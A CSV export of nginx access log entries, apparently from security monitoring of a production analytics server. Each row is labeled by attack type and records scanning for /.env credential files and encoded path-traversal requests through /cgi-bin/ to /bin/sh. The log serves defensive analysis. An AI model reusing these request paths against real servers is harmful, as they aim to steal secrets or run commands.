Stream Name,Client IP,Attack Type,Method,Request Path,Status Code,Raw Log
_nginx_access_log_Analytics_PROD_Lapine,185.198.37.177,Environment File,GET,/.env HTTP/1.1,301,"185.198.37.177 - - [15/Mar/2026:07:13:47 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,185.91.69.217,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"185.91.69.217 - - [15/Mar/2026:07:40:36 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,103.40.61.98,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"103.40.61.98 - - [15/Mar/2026:07:43:18 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,82.24.217.239,Environment File,GET,/.env HTTP/1.1,404,"82.24.217.239 - - [15/Mar/2026:07:47:05 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,107.174.128.134,Environment File,GET,/.env HTTP/1.1,301,"107.174.128.134 - - [15/Mar/2026:08:24:01 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,45.61.122.243,Environment File,GET,/.env HTTP/1.1,404,"45.61.122.243 - - [15/Mar/2026:08:34:08 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,23.95.250.120,Environment File,GET,/.env HTTP/1.1,301,"23.95.250.120 - - [15/Mar/2026:11:02:10 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,46.203.154.158,Environment File,GET,/.env HTTP/1.1,404,"46.203.154.158 - - [15/Mar/2026:12:22:59 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,110.35.80.116,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"110.35.80.116 - - [15/Mar/2026:12:41:55 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,110.35.80.116,Info Disclosure,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1,400,"110.35.80.116 - - [15/Mar/2026:12:41:55 +0000] ""POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
